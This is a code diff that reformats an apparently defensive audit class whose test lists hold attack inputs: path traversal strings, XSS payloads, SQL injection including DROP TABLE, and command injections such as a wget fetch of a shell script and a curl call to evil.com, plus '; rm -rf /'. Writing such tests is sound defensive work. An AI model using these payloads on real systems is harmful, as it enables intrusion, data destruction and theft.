@@ -38,8 +38,10 @@ class AdversarialAudit:
             ("%2e%2e%2fetc/passwd", "URL-encoded traversal"),
             ("%252e%252e%252fetc/passwd", "Double URL-encoded"),
             ("..%252f..%252f..%252fetc/passwd", "Mixed encoding"),
-            ("....\\\\....\\\\....\\\\windows\\system32",
-             "Mixed slash/backslash"),
+            (
+                "....\\\\....\\\\....\\\\windows\\system32",
+                "Mixed slash/backslash",
+            ),
             ("/etc/passwd", "Absolute path"),
             ("C:\\Windows\\System32", "Windows absolute path"),
             ("\\\\network\\share", "UNC path"),
@@ -69,20 +71,20 @@ class AdversarialAudit:
             ("javascript:alert('xss')", "JavaScript URL"),
             ("<iframe src='javascript:alert(1)'>", "Iframe injection"),
             ("<body onload=alert('xss')>", "Body onload"),
-            ("<input onfocus=alert('xss') autofocus>",
-             "Input autofocus"),
-            ("<select onfocus=alert('xss') autofocus>",
-             "Select autofocus"),
-            ("<textarea onfocus=alert('xss') autofocus>",
-             "Textarea autofocus"),
-            ("<details open ontoggle=alert('xss')>",
-             "Details toggle"),
+            ("<input onfocus=alert('xss') autofocus>", "Input autofocus"),
+            ("<select onfocus=alert('xss') autofocus>", "Select autofocus"),
+            (
+                "<textarea onfocus=alert('xss') autofocus>",
+                "Textarea autofocus",
+            ),
+            ("<details open ontoggle=alert('xss')>", "Details toggle"),
             ("<marquee onstart=alert('xss')>", "Marquee onstart"),
-            ("data:text/html,<script>alert('xss')",
-             "Data URL"),
+            ("data:text/html,<script>alert('xss')", "Data URL"),
             ("vbscript:alert('xss')", "VBScript URL"),
-            ("<script>document.location='http://evil.com'</script>",
-             "Redirect script"),
+            (
+                "<script>document.location='http://evil.com'</script>",
+                "Redirect script",
+            ),
         ]
 
         for payload, description in test_cases:
@@ -104,8 +106,7 @@ class AdversarialAudit:
             ("' OR '1'='1", "Basic SQL injection"),
             ("' OR 1=1--", "SQL injection with comment"),
             ("'; DROP TABLE users--", "SQL injection with DROP"),
-            ("' UNION SELECT * FROM users--",
-             "SQL injection with UNION"),
+            ("' UNION SELECT * FROM users--", "SQL injection with UNION"),
             ("1' AND 1=1--", "SQL injection with AND"),
             ("admin'--", "SQL injection auth bypass"),
             ("' OR '1'='1'#", "SQL injection with # comment"),
@@ -136,8 +137,7 @@ class AdversarialAudit:
             ("|| cat /etc/passwd", "OR operator"),
             ("`whoami`", "Backtick command substitution"),
             ("$(whoami)", "Dollar command substitution"),
-            ("; wget http://evil.com/shell.sh",
-             "Download and execute"),
+            ("; wget http://evil.com/shell.sh", "Download and execute"),
             ("| curl http://evil.com", "Exfiltration via curl"),
         ]
 
@@ -157,14 +157,13 @@ class AdversarialAudit:
         print("\n[5] Testing Skill Injection Attacks")
 
         test_cases = [
-            (["section_sum", "../../../etc/passwd"],
-             "Path traversal in skill"),
-            (["section_sum", "<script>alert('xss')</script>"],
-             "XSS in skill"),
-            (["section_sum", "; rm -rf /"],
-             "Command injection in skill"),
-            (["section_sum", "skill@evil.com"],
-             "Special characters in skill"),
+            (
+                ["section_sum", "../../../etc/passwd"],
+                "Path traversal in skill",
+            ),
+            (["section_sum", "<script>alert('xss')</script>"], "XSS in skill"),
+            (["section_sum", "; rm -rf /"], "Command injection in skill"),
+            (["section_sum", "skill@evil.com"], "Special characters in skill"),
             (["section_sum", "skill/evil"], "Slash in skill name"),
             (["section_sum", "a" * 101], "Buffer overflow in skill name"),
             (["section_sum", "skill\x00evil"], "Null byte in skill"),
@@ -265,7 +264,9 @@ class AdversarialAudit:
         print(f"Total Tests: {self.passed + self.failed}")
         print(f"Passed: {self.passed}")
         print(f"Failed: {self.failed}")
-        print(f"Success Rate: {self.passed / (self.passed + self.failed) * 100:.1f}%")
+        print(
+            f"Success Rate: {self.passed / (self.passed + self.failed) * 100:.1f}%"
+        )
         print("=" * 60)
 
         if self.failed > 0:
